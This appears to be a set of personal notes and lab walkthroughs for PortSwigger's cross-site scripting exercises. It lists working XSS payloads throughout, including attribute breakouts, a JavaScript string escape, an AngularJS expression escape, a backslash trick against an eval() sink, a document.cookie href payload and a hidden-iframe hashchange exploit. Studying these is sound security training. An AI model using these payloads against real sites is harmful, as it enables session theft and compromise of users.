# Cross Site Scripting Notes


[Portswigger](https://portswigger.net/web-security/cross-site-scripting)

## Methodology

Payloads
```
Simple
<script>alert(1)</script>
Close out attribute and created new
"><svg onload=alert(1)>
Escape quotes
"onmouseover="alert(1)
Break out of Javascript string
'-alert(1)-'
AngularJS - look for things like ng-app in source
{{$on.constructor('alert(1)')()}}
```

### Misc DOM stuff
- Here we can see in developer tools the DOM Invader usage, the canary is on the left, you can copy your canary with the button:
![image](https://github.com/user-attachments/assets/66afdc74-2726-47ee-80b6-b0f2a8a25a56)
  
Now this is how we use DOM Invader and sending the canary into every input will help us find DOM XSS, but let's discuss now how we can view sinks in source. When inputting a string of random values that stand out like maybe `XSS` or `xvr7bpon`, it's arbitrary, we can find out more about what's happening. In this use case if we notice that our results get processed by another script like this:

![image](https://github.com/user-attachments/assets/4dbb0909-db00-4aad-8633-7734a6136193)

Then we need to view that javascript file to determine what's happening. 

![image](https://github.com/user-attachments/assets/373b2a7e-b676-44d0-8e6d-3da1f172612a)

We can see in Searchresults.js that it is using the `eval()` function which is a good place for us to attempt exploiting XSS. Now to break out let's just use what portswigger wrote to understand what's happening: 

```
payload used:
\"-alert(1)}//
```


_As you have injected a backslash and the site isn't escaping them, when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out. This means that the double-quotes are processed unescaped, which closes the string that should contain the search term._

_An arithmetic operator (in this case the subtraction operator) is then used to separate the expressions before the alert() function is called. Finally, a closing curly bracket and two forward slashes close the JSON object early and comment out what would have been the rest of the object. As a result, the response is generated as follows:_ 
`{"searchTerm":"\\"-alert(1)}//", "results":[]}`

# Labs walkthroughs

### Reflected XSS into HTML context with nothing encoded

Enter this in the search box
`<script>alert(1)</script>`

### Stored XSS into HTML context with nothing encoded

Enter this as a comment
`<script>alert(1)</script>`

### DOM XSS in document.write sink using source location.search

- Enter random input to the search box
- If we right click and inspect the page we can view that the random string we entered is placed inside the img src attribute
- enter this payload to pop xss `"><svg onload=alert(1)>`

### DOM XSS in innerHTML sink using source location.search

- Inject this into the search box `<img src=1 onerror=alert(1)>`

### DOM XSS in jQuery anchor href attribute sink using location.search source

- On the submit feedback page, change the query parameter `returnPath` to `/` followed with some random string
- right-click and inspect the element, and observe that your random string has been placed inside an `href` attribute
- Now enter this: `javascript:alert(document.cookie)`

### DOM XSS in jQuery selector sink using a hashchange event

So we notice a hashchange value in the page, we control this variable and can put our JQuery xss in this value in the url.

To exploit this we need to send an iframe with this payload in it

```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```
We can add `hidden="hidden"` to hide our iframe on the browser

### Reflected XSS into attribute with angle brackets HTML-encoded

- Inject a string in the search box, review what the return is and see that your string is reflected
- send this to repeater and notice your text is in a quoted `("")` attribute.
- break the quote and send in payload like this `"onmouseover="alert(1)`

### Stored XSS into anchor href attribute with double quotes HTML-encoded

- post comment with a random string in the website input
- notice it is placed in an anchor `href` attribute
- enter this payload `javascript:alert(1)`, to trigger right click in burp and select `"copy URL"` and paste it in your browser

### Reflected XSS into a JavaScript string with angle brackets HTML encoded

- inject string like above
- notice it is reflected inside a JavaScript string
- break out of string with a payload like: `'-alert(1)-'`

### DOM XSS in document.write sink using source location.search inside a select element

- when visiting the site go to a product and read the source
- you encounter information about a location.search function referencing a storeId value. We don't have this in the URL parameters we have so attempt to add this to the URL.
- Now with DOM Invader turned on inject your canary into the storeId parameter
- DOM Invader will have a simple `exploit` button you can use to exploit or use this payload `"></select><img%20src=1%20onerror=alert(1)>`

### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

- enter string into search bar, again can use DOM invaders canary for this
- view source to examine the sink, notice the usage of ng-app this implies this is AngularJS
- Now we can abuse AngularJS `{{$on.constructor('alert(1)')()}}`

### Reflected DOM XSS

- again can use DOM Invader, but for more indepth understanding let's discuss it here
- I wrote more of this lab above in DOM misc, but injection is `\"-alert(1)}//`

### Stored DOM XSS

- we can post our canary from DOM Invader and notice the comment field might be injectable
- review sources in developer tools and we see a loadCommentsWithEscapeHtml.js
- Here we see it replacing <> with &lt or &gt

![image](https://github.com/user-attachments/assets/afde9de6-9825-48d9-839f-c7bb7b01eeda)

- since replace() only looks for first accorance of the brackets placing dumby ones beforehand will let us continue injecting our payload with no issues: `<><img src=1 onerror=alert(1)>`





